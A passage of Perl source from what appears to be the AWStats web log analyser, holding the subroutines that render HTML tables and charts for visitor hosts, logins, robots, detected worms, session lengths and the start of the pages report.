0\n\t\t|| $rest_p > 0\n\t\t|| $rest_h > 0\n\t\t|| $rest_k > 0 )\n\t{    # All other domains (known or not)\n\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\">&nbsp;</td><td colspan=\\\"2\\\" class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowDomainsStats =~ /U/i ) { print \"<td>$rest_u</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /V/i ) { print \"<td>$rest_v</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /P/i ) { print \"<td>$rest_p</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the hosts chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHosts{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowHostsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"visitors\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[81] ($Message[77] $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allhosts\")\n\t\t: \"$StaticLinks.allhosts.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lasthosts\")\n\t\t: \"$StaticLinks.lasthosts.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[9]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownip\")\n\t\t: \"$StaticLinks.unknownip.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[45]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=VISITOR&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\t  \n\t&tab_head( \"$title\", 19, 0, 'visitors' );\n\t\n\t&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \\%_host_h,\n\t\t\\%_host_p );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_host_h{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Hosts\",              \"hosts\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<th>\";\n\tif ( $MonthRequired ne 'all' ) {\n\t\tprint\n\"$Message[81] : \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1]<br />\".Format_Number($TotalUnique).\" $Message[11]</th>\";\n\t}\n\telse {\n\t\tprint \"$Message[81] : \" . ( scalar keys %_host_h ) . \"</th>\";\n\t}\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $count = 0;\n\t\n\tmy $regipv4 = qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\t\n\n        if ( $DynamicDNSLookup == 2 ) {\n\t        # Use static DNS file\n                &Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 );\n        }\n\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">$key\";\n\n\t\tif ($DynamicDNSLookup) {\n\t                # Dynamic reverse DNS lookup\n\t                if ($key =~ /$regipv4/o) {\n\t\t                my $lookupresult=lc(gethostbyaddr(pack(\"C4\",split(/\\./,$key)),AF_INET));\t# This may be slow\n                \t        if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {\n                                        if ( $DynamicDNSLookup == 2 ) {\n                                                # Check static DNS file\n                                                $lookupresult = $MyDNSTable{$key};\n                                                if ($lookupresult) { print \" ($lookupresult)\"; }\n                                                else { print \"\"; }\n                                        }\n                                        else { print \"\"; }\n                                }\n                                else { print \" ($lookupresult)\"; }\n                        }\n                }\n\n\t\tprint \"</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint '<td>' . ( Format_Number($_host_p{$key}) || \"&nbsp;\" ) . '</td>';\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint '<td>' . Format_Bytes( $_host_k{$key} ) . '</td>';\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint '<td nowrap=\"nowrap\">'\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . '</td>';\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) { print \"<td>\".Format_Number($rest_p).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the logins chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainLogins{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowAuthenticatedUsers\", 2 ); }\n\tprint \"$Center<a name=\\\"logins\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[94] ($Message[77] $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=alllogins\")\n\t\t: \"$StaticLinks.alllogins.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastlogins\")\n\t\t\t: \"$StaticLinks.lastlogins.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t}\n\t&tab_head( \"$title\", 19, 0, 'logins' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[94] : \"\n\t  . Format_Number(( scalar keys %_login_h )) . \"</th>\";\n\t&HTMLShowUserInfo('__title__');\n\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_login_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_login_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \\%_login_h,\n\t\t\\%_login_p );\n\tforeach my $key (@keylist) {\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p = int( $BarWidth * $_login_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_login_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_login_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\t&HTMLShowUserInfo($key);\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_login_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_login_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_login_l{$key}\n\t\t\t\t? Format_Date( $_login_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_login_p{$key};\n\t\t$total_h += $_login_h{$key};\n\t\t$total_k += $_login_k{$key};\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_h = $TotalHits - $total_h;\n\tmy $rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other logins\n\t\tprint\n\t\t  \"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . \"$Message[125]\"\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" )\n\t\t  . \"</span></td>\";\n\t\t&HTMLShowUserInfo('');\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the robots chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainRobots{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowRobotStats\", 2 ); }\n\tprint \"$Center<a name=\\\"robots\\\">&nbsp;</a><br />\\n\";\n\n\tmy $title = \"$Message[53] ($Message[77] $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allrobots\")\n\t\t\t: \"$StaticLinks.allrobots.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastrobots\")\n\t\t\t: \"$StaticLinks.lastrobots.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ROBOT&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \n    &tab_head( \"$title\", 19, 0, 'robots');\n        \n    print \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(16) . \"><th>\"\n\t  . Format_Number(( scalar keys %_robot_h ))\n\t  . \" $Message[51]*</th>\";\n\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = my $total_r = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \\%_robot_h,\n\t\t\\%_robot_h );\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))\n\t\t\t  . ( $_robot_r{$key} ? \"+$_robot_r{$key}\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_robot_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_robot_l{$key}\n\t\t\t\t? Format_Date( $_robot_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_robot_p{$key};\n\t\t$total_h += $_robot_h{$key};\n\t\t$total_k += $_robot_k{$key} || 0;\n\t\t$total_r += $_robot_r{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For bots we need to count Totals\n\tmy $TotalPagesRobots =\n\t  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }\n\tmy $TotalHitsRobots = 0;\n\tforeach ( values %_robot_h ) { $TotalHitsRobots += $_; }\n\tmy $TotalBytesRobots = 0;\n\tforeach ( values %_robot_k ) { $TotalBytesRobots += $_; }\n\tmy $TotalRRobots = 0;\n\tforeach ( values %_robot_r ) { $TotalRRobots += $_; }\n\tmy $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\tmy $rest_h = $TotalHitsRobots - $total_h;\n\tmy $rest_k = $TotalBytesRobots - $total_k;\n\tmy $rest_r = $TotalRRobots - $total_r;\n\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )\n\t{               # All other robots\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $rest_h - $rest_r ))\n\t\t\t  . ( $rest_r ? \"+$rest_r\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\n\t\t\"* $Message[156]\" . ( $TotalRRobots ? \" $Message[157]\" : \"\" ) );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the worms chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainWorms{\n\tif ($Debug) { debug( \"ShowWormsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"worms\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( \"$Message[163] ($Message[77] $MaxNbOf{'WormsShown'})\",\n\t\t19, 0, 'worms' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\" . Tooltip(21) . \">\";\n\tprint \"<th>\" . Format_Number(( scalar keys %_worm_h )) . \" $Message[164]*</th>\";\n\tprint \"<th>$Message[167]</th>\";\n\tif ( $ShowWormsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowWormsStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowWormsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \\%_worm_h,\n\t\t\\%_worm_h );\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $WormsHashLib{$key} ? $WormsHashLib{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $WormsHashTarget{$key} ? $WormsHashTarget{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tif ( $ShowWormsStats =~ /H/i ) {\n\t\t\tprint \"<td>\" . Format_Number($_worm_h{$key}) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_worm_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_worm_l{$key}\n\t\t\t\t? Format_Date( $_worm_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_worm_p{$key};\n\t\t$total_h += $_worm_h{$key};\n\t\t$total_k += $_worm_k{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For worms we need to count Totals\n\tmy $TotalPagesWorms =\n\t  0;    #foreach (values %_worm_p) { $TotalPagesWorms+=$_; }\n\tmy $TotalHitsWorms = 0;\n\tforeach ( values %_worm_h ) { $TotalHitsWorms += $_; }\n\tmy $TotalBytesWorms = 0;\n\tforeach ( values %_worm_k ) { $TotalBytesWorms += $_; }\n\tmy $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\tmy $rest_h = $TotalHitsWorms - $total_h;\n\tmy $rest_k = $TotalBytesWorms - $total_k;\n\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other worms\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td class=\\\"aws\\\">-</td>\";\n\t\tif ( $ShowWormsStats =~ /H/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($rest_h)) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\"* $Message[158]\");\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the sessions chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSessions{\n\tif ($Debug) { debug( \"ShowSessionsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"sessions\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[117]\";\n\t&tab_head( $title, 19, 0, 'sessions' );\n\tmy $Totals = 0;\n\tmy $average_s = 0;\n\tforeach (@SessionsRange) {\n\t\t$average_s += ( $_session{$_} || 0 ) * $SessionsAverage{$_};\n\t\t$Totals += $_session{$_} || 0;\n\t}\n\tif ($Totals) { $average_s = int( $average_s / $Totals ); }\n\telse { $average_s = '?'; }\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(1)\n\t  . \"><th>$Message[10]: \".Format_Number($TotalVisits).\" - $Message[96]: \".Format_Number($average_s).\" s</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[10]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t$average_s = 0;\n\tmy $total_s   = 0;\n\tmy $count = 0;\n\tforeach my $key (@SessionsRange) {\n\t\tmy $p = 0;\n\t\tif ($TotalVisits) {\n\t\t\t$p = int( $_session{$key} / $TotalVisits * 1000 ) / 10;\n\t\t}\n\t\t$total_s += $_session{$key} || 0;\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_session{$key} ? Format_Number($_session{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_session{$key} ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\tmy $rest_s = $TotalVisits - $total_s;\n\tif ( $rest_s > 0 ) {    # All others sessions\n\t\tmy $p = 0;\n\t\tif ($TotalVisits) {\n\t\t\t$p = int( $rest_s / $TotalVisits * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr\"\n\t\t  . Tooltip(20)\n\t\t  . \"><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\tprint \"<td>\".Format_Number($rest_s).\"</td>\";\n\t\tprint \"<td>\" . ( $rest_s ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the pages chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainPages{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) {\n\t\tdebug(\n\"ShowPagesStats (MaxNbOf{'PageShown'}=$MaxNbOf{'PageShown'} TotalDifferentPages=$TotalDifferentPages)\",\n\t\t\t2\n\t\t);\n\t}\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint\n\"$Center<a name=\\\"urls\\\">&nbsp;</a><a name=\\\"entry\\\">&nbsp;</a><a name=\\\"exit\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[19] ($Message[77] $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urldetail\")\n\t\t: \"$StaticLinks.urldetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urlentry\")\n\t\t\t: \"$StaticLinks.urlentry.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[104]</a>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . 